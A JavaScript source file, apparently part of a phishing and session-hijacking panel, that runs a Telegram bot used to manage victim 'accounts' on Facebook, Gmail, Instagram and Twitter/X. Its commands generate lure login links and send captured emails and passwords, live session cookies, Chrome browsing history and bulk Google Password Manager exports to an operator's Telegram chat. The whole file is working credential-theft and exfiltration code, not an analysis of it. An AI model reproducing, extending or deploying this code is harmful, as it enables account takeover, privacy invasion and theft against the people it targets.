// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op when TELEGRAM_BOT_TOKEN /
// TELEGRAM_CHAT_ID aren't configured, or when Telegram itself is unreachable.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  const body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch { /* best-effort */ }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

// sendPhoto — sends a JPEG/PNG buffer as an inline photo (visible directly in chat).
// Use this for screenshots instead of sendDocument.
export async function sendPhoto(buffer, caption, chatId) {
  if (!isEnabled()) return;
  try {
    const targetChat = chatId || config.telegramChatId;
    const boundary = '----spPhotoBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${targetChat}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption.slice(0, 1024)}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="photo"; filename="screen.jpg"\r\n`);
    text(`Content-Type: image/jpeg\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendPhoto'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

// ── Helper ────────────────────────────────────────────────────────────────────

async function replyTo(chatId, text) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

// ── /adduser <login> <password> — create panel user ──────────────────────────

async function handlePanelAdduser(chatId, args) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /adduser <login> <hasło>\nHasło min. 8 znaków.');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  const password = String(args[1]);
  // Validate before touching userdb
  if (!/^[a-z0-9_-]{1,64}$/.test(username)) {
    await replyTo(chatId, '❌ Login: tylko litery a-z, cyfry, _ lub -. Max 64 znaki.');
    return;
  }
  if (password.length < 8) {
    await replyTo(chatId, '❌ Hasło za krótkie (min. 8 znaków).');
    return;
  }
  try {
    const { createUser } = await import('./userdb.js');
    await createUser(username, password);
    await replyTo(chatId, `✅ Użytkownik "${username}" utworzony.`);
  } catch (err) {
    if (err?.message === 'username_taken') {
      await replyTo(chatId, `❌ Login "${username}" już istnieje.`);
    } else {
      await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
    }
  }
}

// ── /users — list panel users ─────────────────────────────────────────────────

async function handleUsers(chatId) {
  try {
    const { listUsers } = await import('./userdb.js');
    const users = await listUsers();
    if (users.length === 0) {
      await replyTo(chatId, 'Brak użytkowników.');
      return;
    }
    const lines = users.map(u => {
      const date = new Date(u.createdAt).toISOString().slice(0, 10);
      const status = u.active ? '✓' : '✗';
      return `${status} ${u.username}  (${date})`;
    });
    await replyTo(chatId, `Użytkownicy (${users.length}):\n${lines.join('\n')}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /deluser <login> — delete panel user ─────────────────────────────────────

async function handleDeluser(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /deluser <login>');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  try {
    const { deleteUser } = await import('./userdb.js');
    const { deleteSessionsByUsername } = await import('./session.js');
    const removed = await deleteUser(username);
    if (!removed) {
      await replyTo(chatId, `❌ Nie znaleziono użytkownika "${username}".`);
      return;
    }
    deleteSessionsByUsername(username);
    await replyTo(chatId, `✅ Usunięto użytkownika "${username}" i unieważniono jego sesje.`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /getpass [id] — show stored credentials ───────────────────────────────────

async function handleGetPass(chatId, args) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (args.length > 0) {
      const id = args[0].toLowerCase();
      const acc = list.find(a => a.id === id);
      if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
      const lines = [`📋 Konto: ${acc.label} (${acc.id})`];
      if (acc.email)    lines.push(`📧 Email: ${acc.email}`);
      if (acc.password) lines.push(`🔑 Hasło: ${acc.password}`);
      if (!acc.email && !acc.password) lines.push('(brak zapisanych danych logowania)');
      await replyTo(chatId, lines.join('\n'));
    } else {
      // List all accounts with stored credentials
      const withCreds = list.filter(a => a.email || a.password);
      if (withCreds.length === 0) { await replyTo(chatId, 'Brak zapisanych danych logowania.'); return; }
      const lines = [`🔐 Zapisane dane (${withCreds.length}):`];
      for (const acc of withCreds) {
        lines.push(`\n📋 ${acc.label} (${acc.id})`);
        if (acc.email)    lines.push(`  📧 ${acc.email}`);
        if (acc.password) lines.push(`  🔑 ${acc.password}`);
      }
      await replyTo(chatId, lines.join('\n'));
    }
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /cookies <id> — export cookies as JSON file ───────────────────────────────

async function handleCookies(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /cookies <id>');
    return;
  }
  const id = args[0].toLowerCase();
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(id);
    if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
    const { getContext } = await import('./browser.js');
    const ctx = getContext(id);
    if (!ctx) { await replyTo(chatId, `❌ Sesja "${id}" nie jest uruchomiona.`); return; }
    const cookies = await ctx.cookies();
    const json = JSON.stringify(cookies, null, 2);
    const buf = Buffer.from(json, 'utf8');
    await sendDocument(buf, `cookies-${id}.json`, `🍪 Cookies: ${acc.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /accounts — list all accounts ────────────────────────────────────────────

async function handleAccounts(chatId) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) { await replyTo(chatId, 'Brak kont.'); return; }
    const lines = [`📱 Konta (${list.length}):`];
    for (const acc of list) {
      const hasCreds = acc.email || acc.password ? ' 🔑' : '';
      lines.push(`• ${acc.id} — ${acc.label}${hasCreds}`);
    }
    lines.push('\nUżyj /getpass <id> lub /cookies <id>');
    await replyTo(chatId, lines.join('\n'));
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /addaccount <name> <platform> — create account ───────────────────────────

const PLATFORM_URLS = {
  facebook: 'https://www.facebook.com/', fb: 'https://www.facebook.com/',
  gmail: 'https://mail.google.com/mail/u/0/', gm: 'https://mail.google.com/mail/u/0/',
  google: 'https://mail.google.com/mail/u/0/',
  instagram: 'https://www.instagram.com/', ig: 'https://www.instagram.com/',
  twitter: 'https://x.com/', tw: 'https://x.com/', x: 'https://x.com/',
};
const PLATFORM_LABELS = {
  facebook: 'Facebook', fb: 'Facebook',
  gmail: 'Gmail', gm: 'Gmail', google: 'Gmail',
  instagram: 'Instagram', ig: 'Instagram',
  twitter: 'Twitter / X', tw: 'Twitter / X', x: 'Twitter / X',
};
const PLATFORM_CANONICAL = {
  facebook: 'facebook', fb: 'facebook',
  gmail: 'gmail', gm: 'gmail', google: 'gmail',
  instagram: 'instagram', ig: 'instagram',
  twitter: 'twitter', tw: 'twitter', x: 'twitter',
};

async function handleAddAccount(chatId, args, publicHost) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
    return;
  }
  const name = args[0];
  const platform = args[1].toLowerCase();
  const startUrl = PLATFORM_URLS[platform];
  if (!startUrl) {
    await replyTo(chatId, `❌ Nieznana platforma: "${platform}"\nDostępne: facebook (fb), gmail (gm), instagram (ig), twitter (tw)`);
    return;
  }
  const canonical = PLATFORM_CANONICAL[platform];
  const platLabel = PLATFORM_LABELS[platform];
  const label = `${name} – ${platLabel}`;
  const id = `${name}-${canonical}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
  if (!id) { await replyTo(chatId, '❌ Nazwa zawiera niedozwolone znaki.'); return; }
  try {
    const { saveAccount, getAccount } = await import('./accounts.js');
    const { start, stop, wipeProfile } = await import('./browser.js');
    const existed = Boolean(await getAccount(id));
    if (!existed) { await stop(id).catch(() => {}); await wipeProfile(id); }
    await saveAccount({ id, label, startUrl });
    await start(id, '127.0.0.1').catch(() => {});
    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const host = publicHost || config.publicHost;
    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(brak PUBLIC_HOST)';
    await replyTo(chatId, `✅ Konto "${label}" utworzone!\n🔗 Link: ${link}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /panel — inline keyboard main menu ───────────────────────────────────────

async function editMessage(chatId, messageId, text) {
  try {
    await fetch(apiUrl('editMessageText'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

async function sendInlineMessage(chatId, text, inline_keyboard) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        reply_markup: { inline_keyboard },
        disable_web_page_preview: true,
      }),
    });
  } catch { /* best-effort */ }
}

async function answerCallback(callbackQueryId, text) {
  try {
    await fetch(apiUrl('answerCallbackQuery'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
    });
  } catch { /* best-effort */ }
}

async function handlePanel(chatId, publicHost) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) {
      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
      return;
    }
    const keyboard = list.map(acc => {
      const icon = acc.email ? '🔑 ' : '';
      return [{ text: `${icon}${acc.label}`, callback_data: `acc:${acc.id}` }];
    });
    keyboard.push([{ text: '➕ Dodaj konto', callback_data: 'help:addaccount' }]);
    keyboard.push([{ text: '📋 Historia wszystkich kont', callback_data: 'hist:all' }]);
    await sendInlineMessage(chatId, `📱 Konta (${list.length}):`, keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleAccountMenu(chatId, accountId, callbackQueryId, publicHost) {
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(accountId);
    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
    await answerCallback(callbackQueryId);

    const host = publicHost || config.publicHost;
    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;

    const lines = [`📋 *${acc.label}*`];
    if (acc.email)    lines.push(`📧 ${acc.email}`);
    if (acc.password) lines.push(`🔑 ${acc.password}`);

    const keyboard = [
      [
        { text: '🔑 Hasła (plik)', callback_data: `pass:${accountId}` },
        { text: '🍪 Cookies', callback_data: `cook:${accountId}` },
      ],
      [
        { text: '📋 Historia wyszukiwań', callback_data: `hist:${accountId}` },
        { text: '🔐 Google Passwords', callback_data: `gpas:${accountId}` },
      ],
    ];
    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
    keyboard.push([{ text: '« Wróć', callback_data: 'panel' }]);

    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handlePassFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Generuję plik...');
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    const withCreds = accountId === 'all'
      ? list.filter(a => a.email || a.password)
      : list.filter(a => a.id === accountId && (a.email || a.password));
    if (withCreds.length === 0) {
      await replyTo(chatId, '(brak zapisanych danych logowania)');
      return;
    }
    const lines = [];
    for (const acc of withCreds) {
      lines.push(`=== ${acc.label} (${acc.id}) ===`);
      if (acc.email)    lines.push(`Email:  ${acc.email}`);
      if (acc.password) lines.push(`Hasło:  ${acc.password}`);
      lines.push('');
    }
    const buf = Buffer.from(lines.join('\n'), 'utf8');
    const fname = accountId === 'all' ? 'hasla-wszystkie.txt' : `hasla-${accountId}.txt`;
    await sendDocument(buf, fname, `🔑 Dane logowania${accountId === 'all' ? '' : ': ' + withCreds[0]?.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// Returns path to Chrome History SQLite file for a given profile dir, or null.
async function findHistoryPath(profileRoot) {
  const { access, readdir } = await import('node:fs/promises');
  const path = await import('node:path');
  const primary = path.join(profileRoot, 'Default', 'History');
  try { await access(primary); return primary; } catch { /* fall through */ }
  const dirs = await readdir(profileRoot, { withFileTypes: true }).catch(() => []);
  for (const d of dirs) {
    if (!d.isDirectory()) continue;
    const candidate = path.join(profileRoot, d.name, 'History');
    try { await access(candidate); return candidate; } catch { /* skip */ }
  }
  return null;
}


async function handleHistoryFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Czytam historię przeglądarki...');
  try {
    const { loadAccounts, getAccount } = await import('./accounts.js');
    const { copyFile, unlink } = await import('node:fs/promises');
    const { DatabaseSync } = await import('node:sqlite');
    const { gzip } = await import('node:zlib');
    const { promisify } = await import('node:util');
    const path = await import('node:path');
    const gzipAsync = promisify(gzip);

    const isAll = accountId === 'all';
    const accounts = isAll
      ? await loadAccounts()
      : [await getAccount(accountId)].filter(Boolean);

    if (!accounts.length) { await replyTo(chatId, '❌ Brak kont'); return; }

    const allRows = [];
    const tmpFiles = [];
    for (const acc of accounts) {
      const profileRoot = path.join(config.dataDir, 'profiles', acc.id);
      const histPath = await findHistoryPath(profileRoot);
      if (!histPath) continue;
      const tmpPath = path.join(config.dataDir, `hist-tmp-${acc.id}-${Date.now()}.db`);
      tmpFiles.push(tmpPath);
      await copyFile(histPath, tmpPath);
      try {
        const db = new DatabaseSync(tmpPath, { open: true });
        const rows = db.prepare(
          `SELECT CAST((v.visit_time / 1000 - 11644473600000) AS INTEGER) AS ts_ms,
                  u.url, u.title
           FROM visits v JOIN urls u ON v.url = u.id`
        ).all();
        db.close();
        for (const r of rows) allRows.push({ ...r, account: acc.label });
      } catch { /* skip broken db */ }
    }

    for (const t of tmpFiles) await unlink(t).catch(() => {});

    if (!allRows.length) {
      await replyTo(chatId, '❌ Historia przeglądarki jest pusta we wszystkich profilach.');
      return;
    }

    // Sort newest first, cap at 500 000
    allRows.sort((a, b) => b.ts_ms - a.ts_ms);
    const rows = allRows.slice(0, 500000);

    const escape = v => `"${String(v ?? '').replace(/"/g, '""')}"`;
    const lines = ['data,konto,url,tytuł'];
    for (const r of rows) {
      const date = r.ts_ms > 0 ? new Date(r.ts_ms).toISOString().replace('T', ' ').slice(0, 19) : '';
      lines.push([escape(date), escape(r.account), escape(r.url), escape(r.title)].join(','));
    }
    const csvBuf = Buffer.from(lines.join('\n'), 'utf8');
    const compressed = await gzipAsync(csvBuf);
    const fname = isAll ? 'historia-wszystkie.csv.gz' : `historia-${accountId}.csv.gz`;
    const label = isAll ? `wszystkie konta` : accounts[0].label;
    await sendDocument(compressed, fname, `📋 Historia przeglądarki: ${label} (${rows.length} wizyt)`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// Show two-option menu for Google Passwords export
async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId);
  const keyboard = [
    [{ text: '📥 Eksport CSV (ręczny)', callback_data: `gpw_csv:${accountId}` }],
    [{ text: '📋 Lista haseł (powolna)', callback_data: `gpw_rows:${accountId}` }],
  ];
  await sendInlineMessage(chatId,
    '🔐 Wybierz metodę eksportu haseł Google:\n\n' +
    '📥 *Eksport CSV* — otwiera passwords.google.com/options, logujesz się sam i klikasz Eksportuj. Bot wysyła plik CSV na kanał.\n\n' +
    '📋 *Lista haseł* — bot klika każdy wpis po kolei i wyciąga hasła (wolne, wymaga zalogowanej sesji).',
    keyboard
  );
}

// Option 1: User-driven CSV export — user auth + click, bot sends CSV file
async function handleGpwCsv(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Otwieram menadżer haseł...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { readFile } = await import('node:fs/promises');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }

    const { getContext, start, openPasswordsExport } = await import('./browser.js');
    let ctx = getContext(accountId);
    if (!ctx) {
      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
      ctx = getContext(accountId);
      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
    }

    await replyTo(chatId,
      `📥 Otwieram passwords.google.com/options w przeglądarce "${acc.label}".\n\n` +
      `Zaloguj się (jeśli wymagane) i kliknij *Eksportuj hasła*.\n\n` +
      `Bot wysyła screeny co 10 sek żebyś wiedział co się dzieje.`
    );

    const onScreenshot = (buf, url) => {
      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
    };

    const result = await openPasswordsExport(accountId, onScreenshot);

    const buf = await readFile(result.path);
    await sendDocument(buf, result.filename, `🔐 Google Passwords: ${acc.label}`);
    await replyTo(chatId, `✅ Gotowe — plik CSV wysłany powyżej.`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd eksportu CSV: ${err?.message || err}`);
  }
}

// Option 2: Row-by-row click through password list
async function handleGpwRows(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Uruchamiam pobieranie haseł...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { readFile } = await import('node:fs/promises');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }

    const { getContext, start, openPasswordsExportRowByRow } = await import('./browser.js');
    let ctx = getContext(accountId);
    if (!ctx) {
      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
      ctx = getContext(accountId);
      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
    }

    let progressMsgId = null;
    try {
      const r = await fetch(apiUrl('sendMessage'), {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: `🔐 Otwieram passwords.google.com — screeny co 10 sek...` }),
      });
      const d = await r.json();
      progressMsgId = d.result?.message_id;
    } catch {}

    const onScreenshot = (buf, url) => {
      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
    };
    const onProgress = (done, total) => {
      if (progressMsgId && done % 5 === 0) {
        editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${done} / ${total}`).catch(() => {});
      }
    };

    const result = await openPasswordsExportRowByRow(accountId, onScreenshot, onProgress);

    if (progressMsgId) {
      await editMessage(chatId, progressMsgId, `✅ Gotowe: ${result.count} wpisów — wysyłam plik...`);
    }

    const buf = await readFile(result.path);
    // Send file — log Telegram API response for debugging
    try {
      const boundary = '----spBoundary' + Date.now().toString(16);
      const parts = [];
      const t = (s) => parts.push(Buffer.from(s, 'utf8'));
      t(`--${boundary}\r\n`);
      t(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
      t(`--${boundary}\r\n`);
      t(`Content-Disposition: form-data; name="caption"\r\n\r\n🔐 Google Passwords: ${acc.label} (${result.count} wpisów)\r\n`);
      t(`--${boundary}\r\n`);
      t(`Content-Disposition: form-data; name="document"; filename="${result.filename}"\r\n`);
      t(`Content-Type: text/plain\r\n\r\n`);
      parts.push(buf);
      t(`\r\n--${boundary}--\r\n`);
      const tgRes = await fetch(apiUrl('sendDocument'), {
        method: 'POST',
        headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
        body: Buffer.concat(parts),
      });
      const tgData = await tgRes.json().catch(() => ({}));
      if (!tgData.ok) {
        await replyTo(chatId, `⚠️ Telegram odrzucił plik: ${JSON.stringify(tgData.description || tgData)}`);
      }
    } catch (sendErr) {
      await replyTo(chatId, `⚠️ Błąd wysyłania pliku: ${sendErr?.message}`);
    }
    await replyTo(chatId, `✅ Gotowe — ${result.count} haseł.`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── Long-poll command listener ────────────────────────────────────────────────

export function startCommandListener(publicHost) {
  if (!config.telegramBotToken) return;
  const adminId = config.telegramAdminId ? String(config.telegramAdminId) : '';

  let offset = 0;
  let running = true;

  // Flush any stale updates accumulated while bot was offline — avoids
  // replaying old callback_queries on every restart.
  async function flushPendingUpdates() {
    try {
      const res = await fetch(apiUrl('getUpdates') + '?limit=100&timeout=0&allowed_updates=["message","callback_query"]');
      const data = await res.json();
      if (data.result?.length) {
        offset = data.result[data.result.length - 1].update_id + 1;
      }
    } catch { /* ignore */ }
  }

  async function poll() {
    await flushPendingUpdates();
    while (running) {
      try {
        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query","channel_post"]`;
        const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
        if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
        const data = await res.json();
        for (const upd of data.result || []) {
          offset = upd.update_id + 1;

          // ── callback_query (inline keyboard button) ──
          if (upd.callback_query) {
            const cq = upd.callback_query;
            const fromId = String(cq.from?.id || '');
            if (adminId && fromId !== adminId) { await answerCallback(cq.id, '⛔ Brak dostępu'); continue; }
            const chatId = cq.message?.chat?.id;
            const d = cq.data || '';

            if (d === 'panel') {
              await handlePanel(chatId, publicHost);
              await answerCallback(cq.id);
            } else if (d.startsWith('acc:')) {
              await handleAccountMenu(chatId, d.slice(4), cq.id, publicHost);
            } else if (d.startsWith('pass:')) {
              await handlePassFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('cook:')) {
              await answerCallback(cq.id, '⏳ Pobieram cookies...');
              await handleCookies(chatId, [d.slice(5)]);
            } else if (d.startsWith('hist:')) {
              await handleHistoryFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gpas:')) {
              await handleGooglePasswords(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gpw_csv:')) {
              await handleGpwCsv(chatId, d.slice(8), cq.id);
            } else if (d.startsWith('gpw_rows:')) {
              await handleGpwRows(chatId, d.slice(9), cq.id);
            } else if (d === 'help:addaccount') {
              await answerCallback(cq.id);
              await replyTo(chatId, '➕ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
            } else {
              await answerCallback(cq.id);
            }
            continue;
          }

          // ── message / command (also channel_post for broadcast channels) ──
          const msg = upd.message || upd.channel_post;
          if (!msg?.text) continue;
          const fromId = String(msg.from?.id || msg.sender_chat?.id || '');
          const chatId = msg.chat?.id;
          // For channel posts from the configured channel, skip the admin-ID check
          // (channel posts don't carry from.id — they're the channel itself posting).
          const isOwnChannel = String(chatId) === String(config.telegramChatId);
          if (adminId && fromId !== adminId && !isOwnChannel) continue;
          const text = msg.text.trim();
          const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
          if (!cmdMatch) continue;
          const cmd = cmdMatch[1].toLowerCase();
          const rest = cmdMatch[2].trim();
          const parts = rest ? rest.split(/\s+/) : [];

          if (cmd === '/panel' || cmd === '/start') {
            await handlePanel(chatId, publicHost);
          } else if (cmd === '/adduser') {
            await handlePanelAdduser(chatId, parts);
          } else if (cmd === '/users') {
            await handleUsers(chatId);
          } else if (cmd === '/deluser') {
            await handleDeluser(chatId, parts);
          } else if (cmd === '/addaccount') {
            await handleAddAccount(chatId, parts, publicHost);
          } else if (cmd === '/getpass') {
            await handleGetPass(chatId, parts);
          } else if (cmd === '/cookies') {
            await handleCookies(chatId, parts);
          } else if (cmd === '/accounts') {
            await handleAccounts(chatId);
          }
        }
      } catch {
        await new Promise(r => setTimeout(r, 5000));
      }
    }
  }

  poll().catch(() => {});
  return () => { running = false; };
}
